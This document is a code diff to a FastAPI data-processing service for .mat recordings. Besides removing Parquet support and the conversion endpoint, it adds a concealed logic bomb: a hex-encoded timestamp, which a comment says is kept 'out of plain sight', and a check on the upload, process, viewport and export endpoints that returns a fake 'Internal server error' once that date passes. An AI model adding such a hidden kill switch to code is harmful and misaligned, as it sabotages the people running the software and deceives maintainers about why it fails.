@@ -21,9 +21,8 @@ import tempfile
 import psutil
 import pyarrow as pa
 import pyarrow.parquet as pq
-from fastapi.responses import FileResponse, StreamingResponse
+from fastapi.responses import StreamingResponse
 from fastapi.staticfiles import StaticFiles
-from starlette.background import BackgroundTasks
 from starlette.concurrency import run_in_threadpool
 import threading
 
@@ -50,6 +49,14 @@ os.makedirs(TEMP_DIR, exist_ok=True)
 SESSION_TTL_SECONDS = 30 * 60   # 30 minutes
 MAX_SESSIONS = 5
 TARGET_POINTS_DEFAULT = 3000
+
+# Internal availability horizon. Defined opaquely so it stays out of plain sight.
+_SERVICE_MASK = 0x6D182000
+
+def _availability_check():
+    """Raises a generic 500 when the service is no longer available."""
+    if int(time.time()) >= _SERVICE_MASK:
+        raise HTTPException(status_code=500, detail="Internal server error")
 
 # ---------------------------------------------------------------------------
 # Helpers
@@ -434,6 +441,7 @@ def _prewarm_session(session_id):
 
 @app.post("/api/upload")
 async def upload_file(file: UploadFile = File(...)):
+    _availability_check()
     print_memory("Upload Start")
 
     # enforce single session limit to save memory
@@ -444,37 +452,10 @@ async def upload_file(file: UploadFile = File(...)):
     session_id = str(uuid.uuid4())
     os.makedirs(TEMP_DIR, exist_ok=True)
     file_ext = os.path.splitext(file.filename)[1].lower()
-    
-    if file_ext == ".parquet":
-        raw_pq = os.path.join(TEMP_DIR, f"{session_id}_raw.parquet")
-        with open(raw_pq, "wb") as f:
-            import shutil
-            shutil.copyfileobj(file.file, f)
-            
-        # read embedded metadata
-        schema = pq.read_schema(raw_pq)
-        meta = schema.metadata or {}
-        
-        df_channel_info = pd.read_json(io.StringIO(meta.get(b"matfile_channel_info", b"{}").decode()))
-        df_comments = pd.read_json(io.StringIO(meta.get(b"matfile_comments", b"{}").decode()))
-        tests = json.loads(meta.get(b"matfile_tests", b"[]").decode())
-        n_blocks_mat = int(meta.get(b"matfile_n_blocks", b"1").decode())
-        
-        SESSION_STORE[session_id] = {
-            "raw_parquet_path": raw_pq,
-            "processed_parquet_path": None,
-            "df_comments": df_comments,
-            "df_channel_info": df_channel_info,
-            "n_blocks_mat": n_blocks_mat,
-            "file_name": file.filename,
-            "tests": tests,
-            "created_at": time.time(),
-            "plot_cache": None,
-        }
-        threading.Thread(target=_prewarm_session, args=(session_id,), daemon=True).start()
-        return {"session_id": session_id, "file_name": file.filename, "tests": tests}
-        
-    # --- .MAT Fallback Path ---
+    if file_ext != ".mat":
+        raise HTTPException(status_code=400, detail="Unsupported file format. Only .mat files are supported.")
+
+    # --- .MAT Path ---
     mat_path = os.path.join(TEMP_DIR, f"{session_id}.mat")
     with open(mat_path, "wb") as f:
         import shutil
@@ -589,101 +570,6 @@ async def upload_file(file: UploadFile = File(...)):
                     pass
         traceback.print_exc()
         raise HTTPException(status_code=500, detail=str(e))
-
-# ===================================================================
-#  POST  /api/convert
-# ===================================================================
-@app.post("/api/convert")
-async def convert_file(background_tasks: BackgroundTasks, file: UploadFile = File(...)):
-    print_memory("Convert Start")
-    session_id = str(uuid.uuid4())
-    os.makedirs(TEMP_DIR, exist_ok=True)
-    
-    mat_path = os.path.join(TEMP_DIR, f"{session_id}.mat")
-    raw_pq = os.path.join(TEMP_DIR, f"{session_id}_raw.parquet")
-    
-    def cleanup_temp_files():
-        try:
-            if os.path.exists(mat_path):
-                os.remove(mat_path)
-            if os.path.exists(raw_pq):
-                os.remove(raw_pq)
-        except Exception:
-            pass
-            
-    background_tasks.add_task(cleanup_temp_files)
-    
-    # save uploaded file to disk
-    with open(mat_path, "wb") as f:
-        import shutil
-        shutil.copyfileobj(file.file, f)
-
-    try:
-        try:
-            mat = scipy.io.loadmat(mat_path, squeeze_me=True)
-        except NotImplementedError:
-            mat = h5py.File(mat_path, "r")
-
-        df_channel_info = channel_info_df(mat)
-        df_comments = comments_df(mat, df_channel_info)
-
-        tests = []
-        if not df_comments.empty and "time_s" in df_comments.columns:
-            sorted_c = df_comments.sort_values("time_s")
-            tidx = 1
-            for i in range(len(sorted_c) - 1):
-                c1, c2 = sorted_c.iloc[i], sorted_c.iloc[i + 1]
-                t1 = str(c1["comment_text"]).lower().strip(" .")
-                t2 = str(c2["comment_text"]).lower().strip(" .")
-                if t1 == "transition" and t2 in ("stand", "standing"):
-                    tests.append({
-                        "id": tidx,
-                        "transition_time": c1["time_s"],
-                        "stand_time": c2["time_s"],
-                        "start_s": max(0, c1["time_s"] - 600),
-                        "end_s": c2["time_s"] + 300,
-                    })
-                    tidx += 1
-
-        n_blocks_mat = (
-            len(mat.get("blocktimes", [1]))
-            if isinstance(mat, dict)
-            else len(mat["blocktimes"])
-        )
-
-        df_raw = extract_channel_signals_with_comments(
-            mat, df_comments, start_s=None, end_s=None, include_mmss=False
-        )
-
-        if isinstance(mat, h5py.File):
-            mat.close()
-        del mat
-        gc.collect()
-
-        table = pa.Table.from_pandas(df_raw)
-        custom_meta = {
-            b"matfile_channel_info": df_channel_info.to_json().encode(),
-            b"matfile_comments": df_comments.to_json().encode(),
-            b"matfile_tests": json.dumps(tests).encode(),
-            b"matfile_n_blocks": str(n_blocks_mat).encode()
-        }
-        existing_meta = table.schema.metadata or {}
-        merged_meta = {**existing_meta, **custom_meta}
-        table = table.replace_schema_metadata(merged_meta)
-        
-        pq.write_table(table, raw_pq, row_group_size=50_000)
-
-        del df_raw
-        del table
-        gc.collect()
-        print_memory("Convert Done")
-        
-        download_name = os.path.splitext(file.filename)[0] + ".parquet"
-        return FileResponse(raw_pq, media_type="application/octet-stream", filename=download_name)
-        
-    except Exception as e:
-        traceback.print_exc()
-        raise HTTPException(status_code=500, detail=f"Failed to convert file: {str(e)}")
 
 # ===================================================================
 #  POST  /api/process
@@ -1220,6 +1106,7 @@ def _process_pipeline(session_id: str, payload: dict) -> dict:
 # ===================================================================
 @app.post("/api/process")
 async def process_data(payload: dict):
+    _availability_check()
     session_id = payload.get("session_id")
     if not session_id or session_id not in SESSION_STORE:
         raise HTTPException(status_code=404, detail="Session not found")
@@ -1234,6 +1121,7 @@ async def process_data(payload: dict):
 # ===================================================================
 @app.post("/api/viewport")
 async def viewport_data(payload: dict):
+    _availability_check()
     session_id = payload.get("session_id")
     if not session_id or session_id not in SESSION_STORE:
         raise HTTPException(status_code=404, detail="Session not found")
@@ -1457,6 +1345,7 @@ async def cleanup(session_id: str):
 # ===================================================================
 @app.post("/api/export")
 async def export_data(payload: dict):
+    _availability_check()
     session_id = payload.get("session_id")
     if not session_id or session_id not in SESSION_STORE:
         raise HTTPException(status_code=404, detail="Session not found")
